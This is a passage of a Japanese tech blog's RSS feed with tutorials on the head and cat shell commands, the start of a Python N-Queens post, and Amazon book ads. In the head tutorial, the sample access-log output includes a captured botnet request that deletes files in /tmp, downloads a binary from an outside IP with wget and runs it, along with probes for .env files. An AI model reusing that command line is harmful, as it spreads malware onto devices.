またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>（３）【head】シェルスクリプトコマンド活用紹介</title><link>https://suzukiiichiro.github.io/posts/2022-02-10-01-head-suzuki/</link><pubDate>Thu, 10 Feb 2022 10:23:14 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-10-01-head-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-10-01-head-suzuki/bash.jpg" alt="Featured image of post （３）【head】シェルスクリプトコマンド活用紹介" />&lt;h2 id="headコマンド">headコマンド&lt;/h2>
&lt;ul>
&lt;li>headコマンドでファイルの先頭部分だけを表示する&lt;/li>
&lt;li>パイプを使って実行結果の最初の部分だけを確認する&lt;/li>
&lt;li>tailコマンドでファイルの末尾部分だけを表示する&lt;/li>
&lt;li>ログファイルを監視する&lt;/li>
&lt;/ul>
&lt;h2 id="概要">概要&lt;/h2>
&lt;p>headはテキストファイルの最初の10行を、tailは最後の10行を表示するコマンドです。表示する行数は、オプションで変更することができます。&lt;/p>
&lt;p>headコマンドは「コマンド | head」のように、別のコマンドの実行結果の先頭部分を表示する際によく使われます。&lt;/p>
&lt;h2 id="headコマンドの書式">headコマンドの書式&lt;/h2>
&lt;p>head [オプション] ファイル名&lt;/p>
&lt;h2 id="headコマンドの主なオプション">headコマンドの主なオプション&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>オプション&lt;/th>
&lt;th>長いオプション&lt;/th>
&lt;th>意味&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>-c 数字&lt;/td>
&lt;td>&amp;ndash;bytes 数字&lt;/td>
&lt;td>先頭から指定したバイト数のみ表示する。「-c 5 b」のように単位を付加することも可能（b=512, KB=1000, K=1024, MB=1000&lt;em>1000, M=1024&lt;/em>1024…）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-n 数字&lt;/td>
&lt;td>&amp;ndash;lines 数字&lt;/td>
&lt;td>先頭から指定した行数のみ表示する&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-q&lt;/td>
&lt;td>&amp;ndash;quiet, &amp;ndash;silent&lt;/td>
&lt;td>ファイルごとのヘッダ表示を行わない（複数ファイル指定時に使う）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-v&lt;/td>
&lt;td>&amp;ndash;verbose&lt;/td>
&lt;td>常にファイルごとのヘッダ出力を行う&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="headコマンド詳細説明">headコマンド詳細説明&lt;/h2>
&lt;p>headコマンドはファイルの先頭から１０行を表示するコマンドです。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat filename | head
&lt;/code>&lt;/pre>&lt;p>よく使われるオプションは、出力する行数を指定するオプション「n」です。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat filename | head -n20
&lt;/code>&lt;/pre>&lt;p>データをソートしてベスト１０を出力するという場合によく使います。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ sudo cat /var/log/httpd/access_log | grep -iv &amp;quot;ELB-Health-Checker&amp;quot; | awk -F '&amp;quot;' '{ print $1; }' | awk '{ print $2; }' | sort | uniq -c | sort -nr | head
&lt;/code>&lt;/pre>&lt;p>sudo で一時的にrootになります。/var/log/ ディレクトリはローカルアカウントではアクセスできないことが多いです。&lt;br>
では、順番に説明していきます。&lt;/p>
&lt;p>まずは純粋にアクセスログを出力します。&lt;br>
長いのでheadコマンドを使いましょう。&lt;/p>
&lt;pre tabindex="0">&lt;code>suzuki$ sudo cat /var/log/httpd/access_log | head
172.31.44.102 - - [28/Nov/2021:03:09:13 +0900] &amp;quot;GET / HTTP/1.1&amp;quot; 302 206 &amp;quot;-&amp;quot; &amp;quot;ELB-HealthChecker/2.0&amp;quot;
172.31.17.106 - - [28/Nov/2021:03:09:25 +0900] &amp;quot;GET / HTTP/1.1&amp;quot; 302 206 &amp;quot;-&amp;quot; &amp;quot;ELB-HealthChecker/2.0&amp;quot;
172.31.44.102 - - [28/Nov/2021:03:09:43 +0900] &amp;quot;GET / HTTP/1.1&amp;quot; 302 206 &amp;quot;-&amp;quot; &amp;quot;ELB-HealthChecker/2.0&amp;quot;
172.31.17.106 - - [28/Nov/2021:03:09:55 +0900] &amp;quot;GET / HTTP/1.1&amp;quot; 302 206 &amp;quot;-&amp;quot; &amp;quot;ELB-HealthChecker/2.0&amp;quot;
172.31.44.102 - - [28/Nov/2021:03:10:13 +0900] &amp;quot;GET / HTTP/1.1&amp;quot; 302 206 &amp;quot;-&amp;quot; &amp;quot;ELB-HealthChecker/2.0&amp;quot;
172.31.17.106 - - [28/Nov/2021:03:10:25 +0900] &amp;quot;GET / HTTP/1.1&amp;quot; 302 206 &amp;quot;-&amp;quot; &amp;quot;ELB-HealthChecker/2.0&amp;quot;
172.31.44.102 - - [28/Nov/2021:03:10:43 +0900] &amp;quot;GET / HTTP/1.1&amp;quot; 302 206 &amp;quot;-&amp;quot; &amp;quot;ELB-HealthChecker/2.0&amp;quot;
172.31.17.106 - - [28/Nov/2021:03:10:55 +0900] &amp;quot;GET / HTTP/1.1&amp;quot; 302 206 &amp;quot;-&amp;quot; &amp;quot;ELB-HealthChecker/2.0&amp;quot;
117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] &amp;quot;GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1&amp;quot; 302 230 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154&amp;quot;
117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] &amp;quot;CONNECT guba.eastmoney.com:443 HTTP/1.1&amp;quot; 302 215 &amp;quot;-&amp;quot; &amp;quot;Apache-HttpClient/4.1 (java 1.5)&amp;quot;
:
:
:
&lt;/code>&lt;/pre>&lt;p>AWSのロードバランサーからの定期的なポーリングが多いのでgrep -v で除去します。&lt;br>
grepコマンドの -v オプションは「除外する」という意味です。-i オプションは大文字小文字を区別しないという意味です。&lt;/p>
&lt;pre tabindex="0">&lt;code>suzuki$ sudo cat /var/log/httpd/access_log | grep -v &amp;quot;ELB-HealthChecker&amp;quot; | head
117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] &amp;quot;GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1&amp;quot; 302 230 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154&amp;quot;
117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] &amp;quot;CONNECT guba.eastmoney.com:443 HTTP/1.1&amp;quot; 302 215 &amp;quot;-&amp;quot; &amp;quot;Apache-HttpClient/4.1 (java 1.5)&amp;quot;
117.50.1.250 - - [28/Nov/2021:03:10:59 +0900] &amp;quot;GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1&amp;quot; 302 230 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154&amp;quot;
117.50.1.250 - - [28/Nov/2021:03:10:59 +0900] &amp;quot;CONNECT guba.eastmoney.com:443 HTTP/1.1&amp;quot; 302 215 &amp;quot;-&amp;quot; &amp;quot;Apache-HttpClient/4.1 (java 1.5)&amp;quot;
98.244.147.169 - - [28/Nov/2021:03:13:12 +0900] &amp;quot;GET /shell?cd+/tmp;rm+-rf+*;wget+ 185.245.96.227/bins/arm;chmod+777+/tmp/arm;sh+/tmp/arm+selfrep.jaws&amp;quot; 400 226 &amp;quot;-&amp;quot; &amp;quot;-&amp;quot;
61.136.101.77 - - [28/Nov/2021:03:15:39 +0900] &amp;quot;GET http://dushu.baidu.com HTTP/1.1&amp;quot; 302 208 &amp;quot;-&amp;quot; &amp;quot;-&amp;quot;
135.125.246.110 - - [28/Nov/2021:03:17:39 +0900] &amp;quot;POST / HTTP/1.1&amp;quot; 302 205 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36&amp;quot;
135.125.246.110 - - [28/Nov/2021:03:17:39 +0900] &amp;quot;GET /.env HTTP/1.1&amp;quot; 302 209 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36&amp;quot;
61.136.101.133 - - [28/Nov/2021:03:17:46 +0900] &amp;quot;GET http://dushu.baidu.com HTTP/1.1&amp;quot; 302 208 &amp;quot;-&amp;quot; &amp;quot;-&amp;quot;
164.90.204.15 - - [28/Nov/2021:03:20:54 +0900] &amp;quot;CONNECT www.yahoo.com:443 HTTP/1.1&amp;quot; 302 210 &amp;quot;-&amp;quot; &amp;quot;Go-http-client/1.1&amp;quot;
suzuki$
&lt;/code>&lt;/pre>&lt;p>それっぽいログが出るようになりました。&lt;br>
次にどこからのアクセスが多いのかを絞り込みます。&lt;/p>
&lt;pre tabindex="0">&lt;code>suzuki$ sudo cat /var/log/httpd/access_log | grep -v &amp;quot;ELB-HealthChecker&amp;quot; | awk -F '&amp;quot;' '{ print $2; }' | head
GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1
CONNECT guba.eastmoney.com:443 HTTP/1.1
GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1
CONNECT guba.eastmoney.com:443 HTTP/1.1
GET /shell?cd+/tmp;rm+-rf+*;wget+ 185.245.96.227/bins/arm;chmod+777+/tmp/arm;sh+/tmp/arm+selfrep.jaws
GET http://dushu.baidu.com HTTP/1.1
POST / HTTP/1.1
GET /.env HTTP/1.1
GET http://dushu.baidu.com HTTP/1.1
CONNECT www.yahoo.com:443 HTTP/1.1
suzuki$
&lt;/code>&lt;/pre>&lt;p>GETとPOSTの項目に絞り込まれました。&lt;br>
awk コマンドの -F はセパレータで、この場合は &amp;lsquo;&amp;quot;&amp;rsquo; を区切り文字として２番目の値を出力するという意味になります。最後のheadは確認は出力の冒頭だけで十分なのでつけています。&lt;/p>
&lt;p>次は、GET, CONNECT, POSTなどのコマンドを除去します。&lt;br>
awkコマンドのデフォルトのセパレーターは空白なので、空白区切りで数えると二つ目を表す $2 を使って絞り込みます。&lt;/p>
&lt;pre tabindex="0">&lt;code>suzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v &amp;quot;ELB-HealthChecker&amp;quot; | awk -F '&amp;quot;' '{ print $2; }' | awk '{ print $2; }' | head
http://guba.eastmoney.com/list,hk01500_1.html
guba.eastmoney.com:443
http://guba.eastmoney.com/list,hk01500_1.html
guba.eastmoney.com:443
/shell?cd+/tmp;rm+-rf+*;wget+
http://dushu.baidu.com
/
/.env
http://dushu.baidu.com
www.yahoo.com:443
suzuki$
&lt;/code>&lt;/pre>&lt;p>次に、余計な出力を抑制します。&lt;br>
ここでは空白行を出力したくないので grep -v ^$ を使っています。&lt;br>
非常によく使うオプションなので覚えておくとよいです。&lt;/p>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>grep -v ^$&lt;/dd>
&lt;dd>空行を出力しない&lt;/dd>
&lt;dd>行頭を表す「^」と行末を表す「$」の間に何もないですね。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;p>では、同様にgrep -vで アスタリスクとスラッシュだけの行を絞り込みます。&lt;/p>
&lt;pre tabindex="0">&lt;code>suzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v &amp;quot;ELB-HealthChecker&amp;quot; | awk -F '&amp;quot;' '{ print $2; }' | awk '{ print $2; }'| grep -v ^$ | grep -v [*/] |s
ort| head
110.242.68.4:443
110.242.68.4:443
110.242.68.4:443
110.242.68.4:443
110.242.68.4:443
110.242.68.4:443
110.242.68.4:443
110.242.68.4:443
110.242.68.4:443
110.242.68.4:443
suzuki$
&lt;/code>&lt;/pre>&lt;p>最後に、出力をアルファベット順に並べ替えます。sortでよいです。&lt;br>
さらに uniq コマンドで同じ複数のレコードを一つにするわけですが、 -c オプションを使うと、何件の複数のレコードを一つにまとめたのかを、行頭に示してくれます。&lt;br>
そして sort -nr の -n は、行頭の数値、いわゆるuniq -c でまとめた件数を数値として並べ替えるという意味です。-r は、リバース、いわゆる逆順ソートですね。ここでは、件数の多いものから順番に出力します。headコマンドはデフォルトが１０検出力なので、head -n10 と書いてもよいですし、省略して head だけでもよいです。&lt;/p>
&lt;pre tabindex="0">&lt;code>suzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v &amp;quot;ELB-HealthChecker&amp;quot; | awk -F '&amp;quot;' '{ print $2; }' | awk '{ print $2; }'|sort|uniq -c|sort -nr | head
850 http://dushu.baidu.com
839 /form.cgi
485 http://www.baidu.com/pub/css/new_font.css
477 /
265 *
258 guba.eastmoney.com:443
253
209 /.env
200 www.yahoo.com:443
184 istock.jrj.com.cn:443
suzuki$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dt>:sudo cat filename | grep -v &amp;ldquo;除去したい文字列&amp;rdquo; | awk &amp;lsquo;{ print $2; }'| sort | uniq -c |sort -nr | head&lt;/dt>
&lt;dd>これはもはや定番中の定番です。覚えましょう。体に叩き込みましょう。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;p>head コマンドの紹介の割には長くなりました。&lt;/p>
&lt;h1 id="書籍の紹介">書籍の紹介&lt;/h1>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;amp;MarketPlace=JP&amp;amp;ASIN=4774186945&amp;amp;ServiceVersion=20070822&amp;amp;ID=AsinImage&amp;amp;WS=1&amp;amp;Format=_SL250_&amp;amp;tag=nlpqueens-22">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/B00QJINS1A/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=B00QJINS1A&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=36dff1cf8fa7d4852b5a4a3cf874304b" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;amp;MarketPlace=JP&amp;amp;ASIN=B00QJINS1A&amp;amp;ServiceVersion=20070822&amp;amp;ID=AsinImage&amp;amp;WS=1&amp;amp;Format=_SL250_&amp;amp;tag=nlpqueens-22">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;amp;MarketPlace=JP&amp;amp;ASIN=4797393106&amp;amp;ServiceVersion=20070822&amp;amp;ID=AsinImage&amp;amp;WS=1&amp;amp;Format=_SL250_&amp;amp;tag=nlpqueens-22">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>（２）【cat】シェルスクリプトコマンド活用紹介</title><link>https://suzukiiichiro.github.io/posts/2022-02-09-01-cat-suzuki/</link><pubDate>Wed, 09 Feb 2022 12:59:39 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-09-01-cat-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-09-01-cat-suzuki/bash.jpg" alt="Featured image of post （２）【cat】シェルスクリプトコマンド活用紹介" />&lt;h2 id="catコマンド">catコマンド&lt;/h2>
&lt;ul>
&lt;li>ファイルの内容を表示する&lt;/li>
&lt;li>ファイルの内容を行番号付きで表示する&lt;/li>
&lt;li>複数ファイルを連結して1つのファイルにする&lt;/li>
&lt;/ul>
&lt;h2 id="概要">概要&lt;/h2>
&lt;p>「cat」は、「conCATenate（つなぐ、連結する）」のcatです。ファイルを連結するためのコマンドですが、ファイルの内容を表示する際によく使われます。&lt;/p>
&lt;h2 id="catコマンドの書式">catコマンドの書式&lt;/h2>
&lt;p>cat [オプション] ファイル1 ファイル2……&lt;/p>
&lt;h2 id="catコマンドの主なオプション">catコマンドの主なオプション&lt;/h2>
&lt;p>catコマンドの主なオプションは次の通りです。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:center">オプション&lt;/th>
&lt;th>長いオプション&lt;/th>
&lt;th>意味&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:center">-n&lt;/td>
&lt;td>&amp;ndash;number&lt;/td>
&lt;td>行番号を付け加える&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">-b&lt;/td>
&lt;td>&amp;ndash;number-nonblank&lt;/td>
&lt;td>行番号を付け加える。ただし空白行には付けない&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">-s&lt;/td>
&lt;td>&amp;ndash;squeeze-blank&lt;/td>
&lt;td>連続した空行を1行にする&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="catコマンド詳細説明">catコマンド詳細説明&lt;/h2>
&lt;h3 id="ファイルの内容を出力">ファイルの内容を出力&lt;/h3>
&lt;p>filenameの内容をターミナルに出力します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat filename
&lt;/code>&lt;/pre>&lt;p>長いファイルの場合は、lessコマンドを使います。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat filename | less
&lt;/code>&lt;/pre>&lt;h3 id="ファイルの結合">ファイルの結合&lt;/h3>
&lt;p>複数のファイルを結合（連結）させて別ファイルへ出力します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat filename1 filname2 &amp;gt; filename3
&lt;/code>&lt;/pre>&lt;p>追記したい場合は「&amp;raquo;」を使います。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat filename1 filname2 &amp;gt;&amp;gt; filename3
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>「&amp;gt;」をリダイレクト、「&amp;raquo;」をアペンドと言います。「&amp;gt;」はファイルを新規作成してファイルへ出力します。「&amp;raquo;」は既存のファイルへ追記出力します。&lt;/dd>
&lt;dd>「&amp;gt;」は、内容があってもファイルの内容を空にして出力することに注意しなくてはなりません。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h1 id="書籍の紹介">書籍の紹介&lt;/h1>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;amp;MarketPlace=JP&amp;amp;ASIN=4774186945&amp;amp;ServiceVersion=20070822&amp;amp;ID=AsinImage&amp;amp;WS=1&amp;amp;Format=_SL250_&amp;amp;tag=nlpqueens-22">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/B00QJINS1A/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=B00QJINS1A&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=36dff1cf8fa7d4852b5a4a3cf874304b" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;amp;MarketPlace=JP&amp;amp;ASIN=B00QJINS1A&amp;amp;ServiceVersion=20070822&amp;amp;ID=AsinImage&amp;amp;WS=1&amp;amp;Format=_SL250_&amp;amp;tag=nlpqueens-22">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;amp;MarketPlace=JP&amp;amp;ASIN=4797393106&amp;amp;ServiceVersion=20070822&amp;amp;ID=AsinImage&amp;amp;WS=1&amp;amp;Format=_SL250_&amp;amp;tag=nlpqueens-22">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>第6回 pythonでNQueen（エイトクイーン）バックトラック（２）</title><link>https://suzukiiichiro.github.io/posts/2022-02-08-01-ani/</link><pubDate>Wed, 09 Feb 2022 12:55:55 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-08-01-ani/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-08-01-ani/chess.jpg" alt="Featured image of post 第6回 pythonでNQueen（エイトクイーン）バックトラック（２）" />&lt;h2 id="mainメソッド概要">mainメソッド概要&lt;/h2>
&lt;p>今回は前回から引き続きバックトラックを説明していきたいと思います。&lt;/p>
&lt;p>プログラムソースは以下のURLにあります。&lt;/p>
&lt;p>&lt;a class="link" href="https://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py03_nqueen.py" target="_blank" rel="noopener"
>https://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py03_nqueen.py&lt;/a>&lt;/p>
&lt;p>429-437行目でグローバル変数を宣言した後に呼び出されるのは486行目のmainメソッドです。&lt;br>
467-484行目のmainメソッドの内容を見てみましょう。 &lt;br>
nmin=4からMAX=15まで複数のNについて探索し、解の数と実行時間を出力します。&lt;br>
以下が出力結果です。&lt;/p>
&lt;pre tabindex="0">&lt;code>N: Total Unique hh:mm:ss.ms
4: 2 0 0:00:00.000
5: 10 0 0:00:00.000
